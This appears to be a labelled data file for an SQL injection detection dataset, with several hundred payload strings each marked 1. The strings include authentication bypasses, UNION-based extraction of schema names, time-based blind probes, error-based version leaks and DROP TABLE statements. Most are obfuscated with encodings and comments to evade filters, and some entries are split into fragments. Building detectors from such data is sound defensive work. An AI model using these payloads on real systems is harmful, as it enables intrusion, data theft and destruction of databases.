"1%25u0027%25u0020AND%25u0020substring%28database%28%29%2C%25u00201%2C%25u00201%29%25u0020%3E%3D%25u0020%25u0027s%25u0027%25u0020--", 1
"1' OR IF(substring(database(), 1, 1)='a', SLEEP(5), 0)  OR 'b'='b'--", 1
";%09DROP%09TABLE%09users;%09--", 1
"admin%27%20OR%20%271%27%3D%271--ncp5ro", 1
"%u0027OR1	=  1/*%0a*/--%0d%0a", 1
"1AND%0d%0a1=1", 1
"TEST'  oR  '1'%09=	'1'  --", 1
"' OR 1IN (1)1  /*!*/AND 1=1--", 1
"%27%20OR%20%2%371%27%3D%27%31", 1
"TesT'%09%09oR%09%09'1' = '1'%09%09--%09%09", 1
"%3B%20%2544%2552OP%20TABLE%20%2575sers%3B%20----rixyvl9cg4", 1
"1/**/AND/**/1%09= 1", 1
"1'/**/OR/**/IF(substring(database(),/**/1,/**/1)IN (1)'a',/**/SLEEP(5),/**/0)/**/ # more_noise----rmwth6soi2mi5", 1
"%u0027					and					1%20>=	coNVErT(inT,@@vERsion)--", 1
"1'/**/AND/**/substring(database(),/**/1,/**/1)/**/IN/**/(1)/**/'s'/**/--", 1
"1'OR", 1
"IF(substring(database(),1,/*%0a*/1)>%20= 'a',SLEEP(5),0)--%0d%0a", 1
"admi%6e' |%7c '1'='1%2d-hiw8q", 1
"%27%20OR%20%271%27%3D%271#lc7hvntoxpjag", 1
"%27%20OR%201IN%20(1)1%20--%20", 1
"'%09%09%09%09UNION%09%09%09%09SELECT%09%09%09%091,2,3--", 1
"admin'/*!*/OR '1'='1", 1
"%27%20OR%20EXISTS(SELECT%201%20FROM%20users)----o8pjziijszmza", 1
"%27/*!12345*/UNION%20SELECT%20null,%20null,%20null%20--%20", 1
"%27%20AND%201%3Dconvert%28int%2C%40%40version%29%20OR%20%27b%27%3D%27b%27--", 1
";%20d%52OP/**/tablE/**/Use%72S;/**/--", 1
"WAITFOR/*!*/DELAY%u0020%u00270:0:5%u0027 # more_noise--", 1
"1' XOR ascii(substring(database(), 1, 1)) > 100 --", 1
"1'%20   OR %20  IF(substring(database(%29,    1,    1%29%20= %27a%27,    SLEEP(5),    0) %20  %20   %2d-    r%61ndom_noi%73e--", 1
"1' Or ASCII(suBStRiNG(DatABase(), 1, 1)) > 100 --", 1
"; D%52OP T%41BLE users; %2d-", 1
"1%u0027%U0020A/*!*/ND%u0020SUBstRiNg(DATAbASE(),%u00201,%u00201)%u0020%3D%U0020%u0027S%u0027%U0020--", 1
"1)) uNION sElecT 1,daTaBase(),3--", 1
"test' OR '1'='1' -- --38rx806gkfss", 1
"%27%20OR%20%271%27LIKE%271%20--%20random_noise#te5l6m9", 1
"1%u0027%u0020OR%u0020ascii(substring(database(),%201,%u00201))%u0020>%u0020%310%30%20%2d-", 1
"1)UN/*!12345*/ION%0d%0aSELECT%0d%0a1,database(),3--", 1
";/*!12345*/SELECT%20%20%20%20%20pg_sleep(5);%20%20%20%20%20--", 1
"%u0027OREXISTS(SELECT1FROMusers)--%0a", 1
"1%29%29%2520UNI%254fN%2520SEL%2545%2543T%25201%2Cdataba%2573e%28%29%2C3--", 1
"'/**/AND/**/extractvalue(1,concat(0x5c,version()))/**/AND/**/'a'='a'--#ixwjf", 1
"1%27%20UNION%20SELECT%20table_name%2C%20null%2C%20null%20FROM%20information_schema.tables%20 /*!*/AND 1=1--", 1
"%27%20A/*!*/ND%201%3Dco%6eve%72t(int%2c@@version)%2d-#blz6%36kwdi%61us5", 1
"; SELECT pg_sleep(5); ----cvrol2wr", 1
"1AND/*%0d%0a*/1%3D1/*%0a*/%20/*!*/AND%201%3D1", 1
"%27%09%09%09%09%09AND%09%09%09%09%091%2F%2A%2A%2F%2F%2A%2A%2F%3D%091%09%09%09%09%09--%09%09%09%09%09", 1
"'%41%4eD/*%0a*/1=1--", 1
"/*%%30d%0a*/", 1
"'UNION/*%0a*/SELECT1,2,3--", 1
"Test'%20%20%20%20OR%20%20%20%20'1'%20=%20'1'%20%20%20%20/*", 1
";%u0020SELECT%u0020pg_sleep(5);%u0020--#2m1hm", 1
"1' anD Subs%74r%69Ng(DataBA%73E(),%201, 1) = 'S' -%2D OR (1)", 1
"%27%26%26%281%3D1%291%3D1--%2F%2A%250d%250a%2A%2F", 1
"WAITfOR%20deLaY%20%270:0:5%27%20--%20rANdom_noIsE--", 1
"1' or ASci%69(sUbStR%69%6EG(DAtaBASe(), 1, 1)) >%20100 %2D---mIJmMC", 1
"1		AND		1%3d1#kgrr3i0", 1
"1))/**/UNION/**/SELECT/**/1,database(),3----69w7ej6z6kn", 1
"1' %7c| ASCII(suBsTrIN%47(DatABAsE(), 1, 1))%20>%201%300 --", 1
"WAITFOR%20DELAY%20%270%3A0%3A5%27--#6fjs75kex", 1
"%27%20UNION%20SELECT%20null,%20null,%20null%20--%20#2nbyt0pu", 1
"%u0027%u0020UNION%u0020SELECT%u0020null,%u0020null,%u0020null%u0020 OR (1)--%u0020", 1
"1' OR IF(substring(database(), 1, 1)LIKE'a', SLEEP(5), 0) --", 1
"1%27%20or%20aSciI%28SUbsTRinG%28daTabaSE%28%29%2c%201%2c%201%29%29%20%3e%20100%20--#437hfje8", 1
"test'%2f**/OR '1'=%271%27 /*", 1
"TESt' XOR '1'='1'  OR (1)-- --Fur9V5pM9nXc", 1
"1'/**/uNION/**/SEleCT/**/TAblE_NAme,/**/nULl,/**/nuLl/**/frOm/**/InfOrmatIoN_SCHeMa.TAbleS/**/----4ZTsF6Cg3DJ", 1
"'/*!12345*/AND1<=convert(int,@@version)AND/*%0d%0a*/'a'='a'--/*%0d%0a*/", 1
"%27%20UNION%20SELECT%201%2C2%2C3----hwyxlzl6", 1
"1%29%20UnIOn%20SeLeCT%201%2CDataBasE%28%29%2c3----VYX7h1ysum", 1
"1%27%20UNION%20SELECT%20table_name%2C%20null%2C%20null%20FROM%20information_schema.tables%20----gght1ij8juo2s", 1
"1%u0027%u0020O/**/R%u0020IF(substring(database(),%u00201,%u00201)=%u0027a%u0027,%u0020SLEEP(5),%u00200)%u0020--#mefwkzxq0b0c", 1
"1%2%30%41ND%%3201%3D1%20#%20more_noise", 1
";Dr%6fP/*%0%41*/ta%62le/*%0d%0a*/Use%72s;", 1
"--", 1
"test%27%20O%2552%20%271%2527%3D%271%27%20%2F%2A OR 'b'='b'", 1
"; DROP TABLE users; ----6qi234j4oviv6cq", 1
"%27%2F%2A%2A%2FOR%2F%2A%2A%2FEXISTS%28SEL%2F%2A%21%2A%2FECT%2F%2A%2A%2F1%2F%2A%2A%2FFROM%2F%2A%2A%2Fusers%29--%23fv3uc4k1k", 1
"%27%20%20%20%20%20%20%20%20Or%20%20%20%20%20%20%20%20%271%27%2520%3d%20%20%271", 1
"; DrOP TAbLe uSErs; --", 1
"1'%09%09%09Or%09%09%09aSCii(SubsTrING(DAtaBasE(),%09%09%091,%09%09%091))%09%09%09>%09%09%09100%09%09%09--", 1
"'/*!*/&& (1=1)1=1 --", 1
"admin%u0027%u0020OR%u0020%u00271%u0027	=%09%u00271", 1
"%27UNION%2F%2A%250a%2A%2FSELECTnull%2Cnull%2CnullOR%0A%27b%27%3D%27b%27--%250d%250a", 1
"1' OR IF(%73ubstring(d%61tabas%65()%2c 1%2c 1)='a', SLE%45P%285%29, 0) --#4dp62qd8lgv0", 1
"' unIOn SELECt 1,2,3--#112fyrgvo", 1
"test' OR '1'='1' -- --pb41t5ngdchz", 1
"admin' OR '1'='1--pbbg1k", 1
"1' AnD SuBstRING(DATAbasE(), 1, 1) = 's' --", 1
"tEST' oR '1'='1' --", 1
"admin%%327%09%09%09%%309O/**/R%09%09%0%39%%30%39%271%27	%3D%09%271", 1
"TesT' oR '1'='1' /*#JqU0zDt1", 1
"admin%27%20OR%20%271%27%3D%271#3znhan2eljn8op", 1
"%2527OR%2F%2A%250d%250a%2A%2FEXISTS%28SELECT%250d%250a1FROM%2F%2A%250a%2A%2Fusers%29--", 1
"'%20OR 1LIKE1 %2d-", 1
"' ANd 1=COnverT(iNt,@@vERsioN)--", 1
"1))/**/UniON/**/SeLeCT/**/1,dAtabAsE(),3--", 1
"AdMIN'/**/Or '1'='1 /*!*/AnD 1=1#xk1pfuW", 1
"admin%2527OR%250d%250a%25271%2527%253D%25271%2F%2A%250d%250a%2A%2F", 1
"%27/**/AND%201%3DcoNVert(Int,@@vERSIoN)--", 1
"' UNION SEL%45CT null, n%75ll%2c nu%6cl --", 1
"1'%41N%44substring(database(),", 1
"%31,%0d%0%611)/*%0d%0a*/%20%3d%09%27s'----gzmhhujw", 1
"tEst' oR '1'='1' /* -- raNdOm_noIse", 1
"admin%27%20%4fR%20%271%27%3d%271", 1
"'/**/OR/**/1=1/**/ -- random_noise--/**/", 1
"' OR 1<=1  /*!*/AND 1=1--%20-%2dn8ah6", 1
"1'ORIF(substring(database(),%0d%0a1,1)='a',SLEEP(5),0)--#f9m3qqd14j4", 1
"admin'/**/O/*!12345*/R/**/'1'LIKE'1", 1
"test'OR%0a'1'='1'%0a--%0a", 1
"%27%2F%2A%2A%2FOR%20EXISTS%28SELECT%201%20FROM%20users%29--", 1
"test%27/*!12345*/OR%20%271%27%3D%271%27%20--%20", 1
";%20%20%20%20%20SELECT%20%20%20%20%20pg_sleep(5);%20%20%20%20%20%u0020--%u0020random_noise--", 1
"%3B%2520SEL/*!12345*/ECT%20pg_%2573leep%285%29%3B%20-%252d%20%2F%2A%21%2A%2FAND%201%3D1", 1
"%27OR%2F%2A%250d%250a%2A%2F%271%27%3D%271%2F%2A%250d%250a%2A%2F", 1
"' UNIoN SELeCT 1,2,3 oR (1)--", 1
"1			AND			1  =	1			OR			(1)", 1
"' OR 1IN (1)1 --", 1
"%27%20AND%201%20%20%3D%091%20--%20", 1
"admin%27%20OR%20%271%27%3D%271					OR					'b'%09= 'b'", 1
"1'UNIONSELECT/*%0d%0a*/table_name,null,nullFROMinformation_schema.tables--", 1
"1))%20UnioN%20sELect%201,dAtAbase(),3--", 1
"1)%20UNION%20SELECT%201,database(),3%20/*!*/AND%201%3D1--", 1
"admin%u0027%20OR/**/%u00271%u0027%3d%u00271", 1
"' XOR 1=convert(int,@@version)--", 1
"%3B%20SeLect%20PG_SlEep%285%29%3B%20--", 1
"test%u0027%u0020OR%u0020%u00271%u0027=%u00271%u0027%u0020/*#xncxlo7t2q55os0", 1
"test%27%20OR%20%271%27%3D%271%27%20/*/*!*/AND%u0020%u0027a%u0027=%u0027a%u0027", 1
"1' or AScII(sUbStRIng(DAtabase(), 1, 1)) > 100 --", 1
"admin'OR/*%0d%0a*/'1'='1", 1
"'     UNION     SELECT     1,2,3--", 1
";/**/DROP%u0020TABLE%u0020users;%u0020--", 1
"admIn'O/*!12345*/R%0D%0a'1'='1", 1
"", 1
"1%u0027%20OR%20ascii(substring(database(),%201,%201))%20>%20100%20--", 1
"1'/**/O/*!*/R/**/ascii(substring(database(),/**/1,/**/1))/**/>/**/100/**/--", 1
"'%20UNION%20SELECT 1,2,3%2d-", 1
"' %41ND%201=1 --", 1
"'A/**/%4eD%0d%0a1=1/*%0a*/---%2dvg%77%71guaswt5", 1
"%27%20O/*!12345*/R%20%271%27L%49KE%271", 1
"%%327%2%30A%2f*!*/ND%%320e%78tractval%75e%281%2Cconcat%280x5c%2Cversion%2%38%29%29%29--", 1
"1%27%2520oR%20i%2566%28suBSTrIN%2547%28DatAbaSE%2528%29%2C%201%2C%25201%29%3D%27A%27%2C%20SLEE%2550%285%29%2C%200%29%20--", 1
"; DROP TAbLE userS;  # mOrE_nOIsE--", 1
"%27%20or%201%3D1%20--%20", 1
"1' And SubstRing(DAtaBaSE(), 1, 1) IN (1) 's' --", 1
"%27AND%2F%2A%250d%250a%2A%2F1%3Dconvert%28int%2C%40%40version%29--#xkcsg23s", 1
"%27%20AND%20ex%74r%61ctvalue(1,conc%61t(0x5c,version())%29--%2d-6kd%357e", 1
"1)/**/UNION SELECT 1,database(),3--#0y8v5p", 1
"A%2564mIn%2527%20oR%20%271%27%3d%271", 1
"'/*!12345*/And%20%20%20%20%20eXTRACTVAlue(1,cOncat(0x5C,verSiON()))--", 1
"admin'OR", 1
"'1'='1%0a", 1
"' || EXISTS(SELECT 1 FROM users) OR 'b'='b'--", 1
"%27%20UNION%%320SELECT%2%301,2,3-%2d", 1
"%3b%20selECT%20PG_slEEP%285%29%3B%20 or (1)--%23de6Uk", 1
"1'/**%2fOR/**/if(Su%62STRi%6Eg(DaTABasE(),/**%2F1,/**%2f1)%20= 'A',/%2a%2A/S%4cEEP(5),/**/0)%2f**/--", 1
"'/**/oR/**/ExIStS(Select/**/1/**/FroM/**/uSERs)--#Soshpi6Cxl6O7NS", 1
"1)) UNION SELECT 1,database(),3----l0o10axd7cs", 1
"'/**/UNION/**/SELECT/**/1,2,3/**/OR/**/(1)--", 1
"%3B%20SELECT%20pg_sleep%285%29%3B%20 && 'a'='a'--#5m710m", 1
"' OR %271%27='1", 1
"1' OR IF(su%62s%74ring(da%74abase()%2c%201%2c 1)='a', %53LEEP(5), 0)  AND 'a'='a'--", 1
"'%09%09%09%09%09&&%09%09%09%09%09(1  = 1)1  = 1%09%09%09%09%09--%09%09%09%09%09", 1
"1'ORIF(substring(database(),1,1)<='a',SLEEP(5),0)%0a AND 'a'='a'--", 1
"'/**/||/**/(%31%3d1)'1'='1", 1
"1)   UNION   SELECT   1,database(),3--", 1
"WAITFOR%u0020DELAY%u0020%u00270:0:5%u0027 OR (1)--", 1
"1)/**/UNIONSELECT/*%0d%0a*/1,database(),3--", 1
"", 1
"test%u0027%u0020O%52%u0020%u%300271%u002%37LIKE%u00271%%750027%u002%30--%u0%3020", 1
";DROPTABLE/*%0a*/users;", 1
"&& (1=1)'a'='a'--", 1
"admin'XOR/*%0a*/'1'='1/*%0a*/", 1
"%u%30027%%7500%320%4fR%u0020EXISTS(SELE%43T%u00201%%750020FRO%4d%u0020users)%u0020AND%u0020%u0027a%u0027=%u%30027%61%u0027%2d-", 1
"1%u0027%u0020%58OR%u0020asci%69(%73ubst%72ing(datab%61se(),%u00201%2c%u00201))%u0020>%u0020100%u0020--", 1
"T%65St' or '1'IN (1)'1' %2f*", 1
";DROP", 1
"TABLEusers;--", 1
"", 1
"'/**/OR%20%271'='1", 1
"1' ||%20a%53cii(SubsTR%69ng(%44ataBa%53e(), 1, 1%29) > 100  -- ra%6edom_noise--", 1
"%27%20uNION%20SeleCt%20NUlL,%20nUll,%20NuLL%20--%20", 1
"WaITfOr%2F%2a%2a%2FdELAy%20%270%3A0%3A5%27--", 1
"%u0027%u0020AND%u00201=convert(int,@@version) /*!*/AND 1=1--", 1
"%27%20anD%201%3E%3D1%20--%20", 1
"%27%20And%201%3DCONVeRt(INT,@@VErsioN)--", 1
";/**/DROP/**/TABLE/**/users;/**/ AND 'a'='a'--#tkk4fpaxw", 1
"1' or ASCIi(sUBstRinG(daTabasE(), 1, 1)) > 100 --", 1
"WAITFOR%2F%2A%2112345%2A%2FDELAY%20%270%3A0%3A5%27--", 1
"tEST'    ||    '1'< = '1'    --", 1
";/**/SELECT/**/pg_sleep(5);/**/ # more_noise--", 1
"%27UNIONSELECTnull,null,/*%0d%0a*/null--", 1
"%3B%2F%2A%2112345%2A%2FSELECT%2509%2509pg_sleep%285%29%3B%2509%2509--", 1
"%27%2F%2A%2A%2FXOR%201%3D1%20--%20--yn5najpyu4bp", 1
";%0d%0aselEcT%0d%0apg_SleEp(5);--", 1
"1)%29%09UNION%09SELECT%091,dat%61b%61se%28),3--", 1
"1'/**/UnION sELECt tAble_namE, NulL, NULL froM iNFormaTioN_sCHEma.TAblES --", 1
"1))%20UNION%20SELEC%54 1,d%61tabase(),3--", 1
"'/**/O/*!*/R/**/1>=1/**/--/**/", 1
"%u0027/*!12345*/AND%u0020extractvalue(1,concat(0x5c,version()))--", 1
"'/**/AND/**/extractvalue(1,concat(0x5c,version()))----pl79mtlytzce", 1
"1)          UNION          SELECT          1,database(),3----389ez3", 1
"aDMIN%27/**/oR/**/%271%27%3D%271", 1
"test' OR '1'IN (1)'1' --", 1
"%u0027OREXISTS(SELECT%0d%0a1FROM", 1
"users)--", 1
"'/**/ANd 1=ConvErt(iNT,@@veRSioN) OR (1)--", 1
"WAITFO/**/R%u0020DELAY%u0020%u00270:0:5%u0027--", 1
"random_noise--%0a", 1
"'/**/OR/**/EXIST%53(%53ELECT/**/1/**/FROM/**/u%73e%72s)--", 1
"tes%74%u0027			OR			%u00271%u0027%09=%20%u00271%u0027			%2f*--lr1p6kdjp0", 1
"%27%20And%201%3Dco%6eveRt(i%6et,%40@VErSI%6Fn)--", 1
"' XOR 1=c%6fnvert(i%6et,@@version%29 AND 'a'=%27a'-%2d", 1
"%27/%2a!*/UNIONSELE%43T/*%0a%2a/1,2,3/*!*/AND", 1
"%31=1--", 1
"%27%2F%2A%2112345%2A%2FAND%201%3Dconvert%28int%2C%40%40version%29----bian3tqus8", 1
"admin%27%20OR%20%271%27%3D%271%20--%20random_noise", 1
"' OR EXISTS(SELECT%201%20FROM use%72s)%2d-", 1
"admin%u0027%u002%30OR%u0%3020%u%300271%u0027=%u%30027%31#we3odi5t1rd2u2", 1
"'AND%0d%0a1>=convert(int,@@version)--/*%0a*/", 1
"%25u0027%25u0020%7C%7C%25u0020%281%3D1%29EXISTS%28SELECT%25u00201%25u0020FROM%25u0020users%29--", 1
"1) UNION SELECT 1,database(),3--#hzbhjy1risxh9n", 1
";/**/DROP TABLE users; --#mlzcfwfu7th", 1
"1))UNION", 1
"SELECT/*%0d%0a*/1,database(),3--/*%0a*/", 1
"%27%20anD%201%3D1%20--%20", 1
"tesT' oR '1'='1' /*--osrn0cLMwfPV", 1
"%27%2F%2A%2112345%2A%2FOR%201%3D1%20--%20", 1
";drOp%0atabLE/*%0A*/USErs;%0A--", 1
"1))/*!12345*/uNION			SElECt			1,dATABase(),3--", 1
"1%27%20A/**/ND%20substring(database(),%201,%201)%20%3D%20%27s%27%20----cp7v8okzwzvgn", 1
"test'/**//**//**//**/OR/**//**//**//**/'1'%09IN (1)	'1'/**//**//**//**/--/**//**//**//**/", 1
"' Union sELECt 1,2,3 -- raNdOM_NoIse--#bIU1JU604XRfm6y", 1
"%u0027%u0020%41ND%u0020EXTR%61ctVAlUe(1%2cco%6Ecat(0X5C,VErSi%6FN()))--", 1
"1'UNION%0d%0aSELECTtable_name,null,%0anullFROMinformation_schema.tables", 1
"--", 1
"tEsT'or'1'='1'--/*%0a*/#QeAIoo%0d%0a", 1
"%27%20AND%201%3D1%20--%20--w4kjoub", 1
"%%327%20OR%201%3D1%20-%2d%20", 1
"1/**/AND/**/1%3d%31", 1
"1))%20UNION%20SELECT%201,database(),3OR(1)----z36wzl845i/*%0d%0a*/", 1
"1)) UNI%4fN SELE%43T 1,database%28),%33--#rh30fmprbxa", 1
"1'%09%09%09%09%09UNIO%4e%09%09%09%09%09SEL/**/ECT%09%09%09%09%09t%61%62le_%6eame%2c%09%09%09%09%09null,%20null%09%09%09%09%09FROM%09%09%09%09%09information_schema.%74ables%09%09%09%09%09%2d-", 1
"%27%20AND%20e%78tract%76alue(1,concat(0x5c%2cversion%28%29))-%2d#naikcy", 1
"1%%327%20%58OR%20ascii%28substring%28dat%61ba%73e%28%29%2C%201%2C%201%%32%39%%329%20%3E%20100%20--", 1
"1%u0027%u0020UNiOn%u0020SeLeCt%U0020taBLe_namE,%u0020nulL,%u0020NuLL%U0020FrOm%u0020INFoRmatIOn_ScHEMA.TaBLES%U0020--", 1
"'   UNION%20SELEC%54   1%2c2,3--", 1
"1%u0027%u0020AND%u0020substring(database(),%u00201,%u00201)%u0020=%u0020%u0027s%u0027%u0020%u0020#%u0020more_noise--", 1
"1' unIon SelEcT TaBLE_NaME, nuLl, nulL FrOm InforMAtion_SCHemA.tAbLEs --", 1
"1/**/AND          1%09=%091", 1
"'%09%09%09%09Or%09%09%09%09'1'	=	'1", 1
"1))%20UNION%20SELECT%201,database(),3--#v3ew9p", 1
"%u0027%u0020A/*!12345*/ND%u00201%3D1%u0020--%u0020#einb82a3", 1
"1)UNION/*%0d%0a*/SELECT1,database(),3--%0a#wgjsxe4gx", 1
"test%27%2F%2A%250a%2A%2FOR%271%27%0A%3D%271%27%2F%2A%250a%2A%2F%20OR%20%281%29--", 1
"1%27%20XOR%20IF(substring(database(),%201,%201)%3D%27a%27,%20SLEEP(5),%200)%20--#waiu8rq8vh99ap5", 1
"1' || IF(substring(database(), 1, 1)='a', SLEEP(5), 0) --", 1
"%27%20uNION%20selEct%20NuLl,%20NuLL,%20nULl%20--%20", 1
"1%27ORascii(substring(database(),1,", 1
"1))%3E100%20#%20more_noise----67wc2vpwm", 1
"' UnIOn SELect NuLl, nULl, nulL -- #basuo2e", 1
"admin' OR %271'=%271#am2ro", 1
"%27%2F%2A%2A%2FUNIONSELECT%0A1%2C2%2C3--%0A", 1
"1' UNION SELECT t%61ble_n%61me, %6eul%6c, null FRO%4d i%6ef%6frmation_schema.t%61bles --", 1
"'/*%2112345*/AND ex%74ra%63tva%6cue(1,concat(0x5c,%76ersion(%29))--", 1
";sElect/*%0a*/Pg_SLeEP(5);--%0d%0a", 1
"%27/*!12345*/aNd%201%3DCONveRt(INt,@@VeRsiOn)--", 1
"' Or ExisTS(sELECT 1 from uSERS) # more_noise--", 1
"Test%U0027%U0020||%U0020(1%3D1)%u00271%u0027%3d%u00271%u0027%u0020--%U0020", 1
"1%u0027%u0020OR%u0020IF(substring(database(),%u00201,%u00201)%3D%u0027a%u0027,%u0020SLEEP(5),%u00200)%u0020----0yaz6", 1
"'A/*!*/ND%0aextractvalue(1,concat(0x5c,version()))--", 1
"%u0027UNION", 1
"SELECT/*%0a*/1,2,3----48da4en32l", 1
"1%27UNIONSELECT%2F%2A%250d%250a%2A%2Ftable_name%2Cnull%2CnullFROMinformation_schema.tables--%250a", 1
"' || (1=1)1=1 -- #iyooi4qjpysk", 1
"'/**/A%4eD 1=convert(%69nt,@@%76ersio%6e)--", 1
"%u0027/*!*/UNIONSELECTnull,/*%0d%0a*/null,null/*%0a*/--%0a", 1
"%27%2F%2A%2A%2F%20%20UNION%20%20%20SELECT%20%20%201%2C2%2C3--", 1
"' UNION SeleCT 1,2,3--", 1
"1%27%20AND%20substring%28database%28%29%2C%201%2C%201%29%20%3D%20%27s%27%20%20OR%20%27b%27%3D%27b%27--", 1
"1'ANDsubstring(database(),1,1)%20=%20", 1
"'s'--", 1
";DROP/*%0a*/TABLEusers;OR(1)--", 1
"%27%20OR%20%27%2531%27%3D%25271", 1
"1'ORascii(substring(database(),/*%0d%0a*/1,1))%0d%0a>100--", 1
"'&&extractvalue(1,concat(0x5c,version()))--%0d%0a", 1
"%27%20uNIon%20S%2545lE%2543T%201%2C2%2C3%252d-", 1
"%27OREXISTS%28SEL%2F%2A%2112345%2A%2FECT1%2F%2A%250d%250a%2A%2FFROMusers%29--%250d%250a", 1
"te%73t'OR'1'='1'/*%0a", 1
";%u0020DROP%u0020TABLE%u0020users;%u0020 OR 'b'='b'--", 1
"%3B%2F%2A%2A%2FSELECT%20pg_sleep%285%29%3B%20--", 1
"1))/**/UNION/**/SELECT/**/1,database(),3----69musd6n0", 1
"1' or IF(SU%42%53TRINg(dATABAsE%28), %31, 1)='a', SLEe%70%285), 0) --#61wdx6o", 1
"1))%u0020UNIOn%U0020seLEct%u00201,DaTaBASE(),3--#bax5v0mu50", 1
"1)/*!12345*/uNioN seLEcT 1,databasE(),3--", 1
"1%u0020%41ND%u0020%31%20<=%091", 1
"'/*!12345*/UNIONSELECTnull,%0d%0anull,%0d%0anull%0aOR'b'='b'--", 1
"%27%20UNION%20SELECT%201%2C2%2C3--#0os9r7u0iv", 1
"%27%U0020or%u00201>=1%u0020-%2D%u0020", 1
"1%29%29%2509%2509%2509%2509%2509UNION%2509%2509%2509%2509%2509SELECT%2509%2509%2509%2509%25091%2Cdatabase%28%29%2C3--", 1
"WaiTfO/*!*/R%20DELAY%20%270:0:5%27--", 1
"WAITFORDELAY", 1
"'0:0:5'--%0d%0a", 1
"admin%27OR", 1
"%271%27%3D%271--c9n7bn/*%0a*/", 1
"' OR '1'='1--aq30xc", 1
"; DROP T%41BLE use%72s; %2d-", 1
"%27%20UNION%20SELECT%201%2C2%2C3--%23nw08zwf4vn0d", 1
"1%u0027%u0020||%u0020ascii(substring(database(),%u00201,%u00201))%u0020%3E%u0020100%u0020--", 1
"%u0027%u0020unioN%U0020seLeCt%U0020NuLl,%u0020nulL,%u0020NulL%U0020--%U0020", 1
"%27%2F%2A%2A%2FANd%2F%2A%2A%2FexTRAcTvalue%281%2CcONcat%280X5c%2CvERsIon%28%29%29%29--", 1
";dROptAbLEUsERs;--", 1
"", 1
"1)UNIONSELECT/*%0d%0a*/1,database(),3 /*!*/AND 1=1--", 1
"", 1
"1'   ||   IF(substring(database(),   1,   1)%20IN (1)  'a',   SLEEP(5),   0)   --", 1
"1)UNION/*%0d%0a*/SELECT%0d%0a1,database(),3--/*%0d%0a*/", 1
"'%20UNION SELECT null, n%75ll, n%75ll --%20", 1
"1'    UNION    SELECT    table_name,    null,    null    FROM    information_schema.tables    ----2tjxk28", 1
"' AnD ExTrActVALUe(1,COncaT(0X5c,vERsION()))----kpbadjdayq3", 1
"WAITFOR/**/DELAY/**/'0:0:5'----zv1fqrydqra7bh", 1
"1' XOR substring(database(), 1, 1) = 's' ----h3na00jmibwqg8u", 1
"%25u0027%25u0020UNION%25u0020SELECT%25u00201%2C2%2C3%25u0020OR%25u0020%25u0027b%25u0027%3D%25u0027b%25u0027--", 1
"1'/*!12345*/UNION SELECT table_name, null, null FROM information_schema.tables ----jun4kv0o3ucux", 1
"%2527%2520UNION%2520SELECT%2520null%2C%2520null%2C%2520null%2520--%2520", 1
"1)/*!12345*/UNIONSELECT%0d%0a1,database(),3--/*%0a*/", 1
"%27      %20   U%4eION  %20       SELECT         %20nul%6c,%20         null,  %20       null %20        %20    %20    %58OR          'a'	= '%61'--    %20", 1
"test' OR '1'='1' -- --xiyhbhldn4", 1
"%u0%3027/**/A%4eD/**/%65xtractv%61lue(1,concat(%30x5c,version()%29)--", 1
"%3B%25u0020SEL/**/ECT%25u0020pg_sleep%285%29%3B%25u0020--", 1
"1/**/ANd/**/1=1 # more_noise", 1
"1))/*!12345*/UNIONSELECT%0a1,database(),3--/*%0a*/", 1
"1%U0027uNionsELectTaBle_naMe,NUlL,NULLFrOm/*%0A*/inFOrmatioN_SCHeMa.tAbLes/*%0A*/----5f4Z2wY53mJbv2S%0A", 1
";/*!12345*/SELECT/**/pg_sleep(5);/**//**/OR/**/'b'='b'--#bcczxn6zgsi", 1
"%2527%2509%2509%2509%2509%2509OR%2509%2509%2509%2509%2509%25271%2527%2F%2A%2A%2F%253D%2F%2A%2A%2F%2F%2A%2A%2F%25271", 1
"%27||/*%0a*/1%3D1", 1
"--%0a", 1
"1' AND substring(database(), 1, 1) = 's' --#he5wzs4uc5", 1
"admin%u0027%09%09%09%09OR%09%09%09%09%u00271%u0027LIKE%u00271 -- random_noise", 1
"%27%20And%201%3D1%20%20%23%20MOre_nOISe--%20--a3822kyxio", 1
"WAITFOR DELAY '0:0:5'--#z08a3", 1
"%31' OR I%46(SubSTRing(D%61taBASE(), 1, 1)='a', SL%45e%50(5), 0)%20 or 'b'='B%27--", 1
"waITfor%2520delAy%2520%25270%3A0%3A5%2527--", 1
"WAITFORDELAY", 1
"'0:0:5'--/*%0a*/", 1
"1)) uNIoN SelEcT 1,daTAbASE(),3--", 1
"1/*!*/AND%20%20%20%201IN%20%20%20%20(1)1--i309nf2u4k", 1
";%20SE%4cECT pg%5fsleep(5); --", 1
"'%20OR/**/'%31'='1", 1
"%2527%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2Fnull%2C%2F%2A%2A%2Fnull%2C%2F%2A%2A%2Fnull%2F%2A%2A%2F--%2F%2A%2A%2F", 1
"1%27%20%55niOn%20SelECT%20TabLe_nAM%65%2c%20NU%6CL,%20NULL%20fROM%20in%66OrMAtioN_schema.t%61BleS%20-%2D", 1
"1%27/**/AND/**/su%62string(database()%2c/**/1%2c/**/1)/**/=/**/'s%27/**/--", 1
"%3B%20DROP%20TABLE%20users%3B%20 /*!*/AND 1=1--", 1
"'%09%09%09AND%09%09%091/**/ =  1%09%09%09--%09%09%09", 1
"1/*!12345*/aND 1>=1", 1
"test%27%2520%2520%2520OR%2520%2520%2520%271%27%3C%2F%2A%2A%2F%3D%09%271%27%2520%2520%2520%2F%2A", 1
"'%20%20%20%20OR%20%20%20%20'1'  LIKE%09'1", 1
"1%29%29UNION%2F%2A%250a%2A%2FSELECT%2F%2A%250a%2A%2F1%2Cdatabase%28%29%2C3--%0A", 1
"; SELeCt PG_sLeEP(5); --", 1
"test'/**/OR '1'='1' /*", 1
"te%73t%27%u0020%4fR%u0020%u00271%u0027>=%u00271%u0027%u0020--%u0020", 1
";/*!12345*/DROP	TABLE	users;	--", 1
"1%27A/*!12345*/NDsubstring(database(),1,/*%0d%0a*/1)%3D%27s%27--", 1
"test'/**/XOR '1'LIKE'1' --", 1
"waitfOR/**/dElAy/**/%270:0:5%27--", 1
"%27OR%0d%0aEXISTS(SELECT", 1
"1FROMusers)--/*%0a*/", 1
"1' AND substring(database(), 1, 1) = 's'  -- random_noise--", 1
"; DrOP TAbLe usErs; --", 1
"test%27%20Or%20%271%27%3D%271%27%20%2F%2A", 1
"%2527%2520AND%2%35%320e%78tractvalu%65%281%2Cconcat%280x5%63%2C%76ers%69on%28%29%29%29--", 1
"%27%20%41ND%2%301IN%20%281%291%20--%%320", 1
"1%20A/*!12345*/ND%201%3D1", 1
"1/*!%31%32345*/anD 1=1#5LGI16I%64", 1
